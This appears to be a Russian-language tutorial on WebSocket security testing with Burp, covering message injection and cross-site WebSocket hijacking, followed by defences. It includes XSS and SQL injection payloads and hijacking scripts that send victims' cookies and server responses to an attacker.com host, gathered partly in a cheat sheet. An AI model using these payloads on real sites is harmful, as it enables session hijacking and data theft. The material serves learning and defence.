
WebSocket — это протокол для постоянного двустороннего соединения между браузером и сервером. (через , например, рекурсию или цикл) Соединение устанавливается через HTTP-рукопожатие (handshake), а потом работает как независимый канал, где обе стороны могут отправлять сообщения в любое время

в отличие от HTTP, где клиент всегда инициирует запрос, WebSocket позволяет серверу самому отправлять данные клиенту. Это удобно для чатов, трейдеров, онлайн-игр, но открывает новые векторы атак

## как перехватывать и модифицировать WebSocket трафик

### Перехват сообщений

в Burp Proxy есть вкладка webSockets history, где видны все сообщения. Включаешь перехват (Intercept on) и можешь менять любое сообщение до того как оно уйдет на сервер или в браузер. Можно настроить фильтры: перехватывать только клиент-серверные или только сервер-клиентные сообщения

### Реплей и создание новых сообщений

в WebSockets history выбираешь любое сообщение и отправляешь в Repeater. Там можно редактировать его, отправлять снова и снова. В Repeater есть отдельная вкладка с историей всех сообщений по этому соединению - можно выбрать любое, отредактировать и переслать

### Манипуляция соединением

в repeater рядом с URL WebSocket есть иконка карандаша. Она открывает окно, где можно:

- прикрепиться к уже существующему соединению
- клонировать соединение (открыть новое с теми же параметрами)
- переоткрыть закрытое соединение, отредактировав параметры рукопожатия

##  базовы типы уязвимостей WebSocket

### 🍺 инъекции через сообщения

Если сервер берет текст из WebSocket сообщения и подставляет его в SQL-запрос, команду ОС или XML-парсер - возникают классические инъекции

Проверять нужно так же, как и обычные параметры HTTP

пример `XSS` через WebSocket в чате:

обыч сообщение
```c
{"message":"Hello Carlos"}
```
вредонос
```html
{"message":"<img src=1 onerror='alert(1)'>"}
```

и если сервер не экранирует вывод, другой пользователь увидит картинку и выполнится Js

### 🍺 уязвимости рукопожатия (handshake)

частый вектор - cross-site WebSocket hijacking (CSWSH)
Это CSRF на рукопожатии WebSocket

условия для атаки:

- сессия поддерживается только через HTTP cookies
   
- в рукопожатии нет CSRF-токенов или других непредсказуемых значений
   
- сервер не проверяет заголовок Origin (или проверяет его неправильно)

пример уязвимого рукопожатия =

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
здесь нет ни CSRF-токена, ни Origin

Атакующий может создать свой сайт, который откроет WebSocket к уязвимому приложению от имени жертвы

-------
### 🍺 сross-site WebSocket hijacking (CSWSH)

это  опасная уязвимость WebSocket, потому что дает атакующему двусторонний доступ к сессии жертвы

атакующий может сделать :

- отправлять любые сообщения от имени жертвы (аналог CSRF, но через WebSocket)
   
- читать все сообщения, которые сервер отправляет жертве (утечка конфиденциальных данных)
   

как построить атаку:

создаем HTML-страницу на своем сервере:
```html
<script>
var ws = new WebSocket('wss://vulnerable.com/chat');
ws.onopen = function() {
    ws.send('{"action":"transfer","amount":10000,"to":"attacker"}');
};
// открыл соединение
ws.onmessage = function(event) {
    fetch('https://attacker.com/steal?data=' + event.data);
};
//выполнил действие в нем, например, получил данные
</script>
```
Когда жертва заходит на эту страницу, браузер открывает WebSocket к уязвимому сайту, используя куки жертвы. Соединение устанавливается, и атакующий может отправлять сообщения и читать ответы

#### ЗАЩИТА WebSocket соединения

### на уровне рукопожатия

- всегда использовать wss:// вместо ws:// (WebSocket over TLS)

- проверять заголовок Origin — он должен совпадать с доверенным доменом
   
- использовать CSRF-токены в рукопожатии (либо в параметрах запроса, либо в отдельном заголовке)
   
- никогда не доверять заголовкам типа X-Forwarded-For для принятия решений о безопасности
   

### на уровне сообщений

- обрабатывать данные из WebSocket как недоверенный ввод на сервере (валидация, параметризация запросов)
   
- экранировать вывод на клиенте перед вставкой в DOM
   
- использовать Content Security Policy для ограничения выполнения скриптов
   

### на уровне архитектуры

- хардкодить URL WebSocket эндпоинта, не собирать его из пользовательского ввода
   
- сессия для WebSocket должна быть привязана к конкретному рукопожатию, нельзя переиспользовать сессию из других соединений
   
- для чувствительных действий использовать одноразовые токены поверх WebSocket

## шпаргалка по WebSocket

### XSS через WebSocket
```html
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

### SQL инъекция (пример для JSON-сообщений)
```c
{"message":"' OR 1=1--"}
{"id": "1' UNION SELECT username,password FROM users--"}
{"username": "admin'--", "password": "anything"}
```

### команды для CSWSH атаки
```js
// открыть соединение
var ws = new WebSocket('wss://target.com/endpoint');
// отправить сообщение
ws.send('{"action":"delete","id":1}');
// украсть ответ
ws.onmessage = function(e) {
    fetch('https://attacker.com/steal?' + btoa(e.data));
};
```

### tест пэйлоады для обнаружения уязвимостей
```c
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
<script>alert(1)</script>
{"test": "'"}
{"test": "\\"}
{"test": "${7*7}"}
```
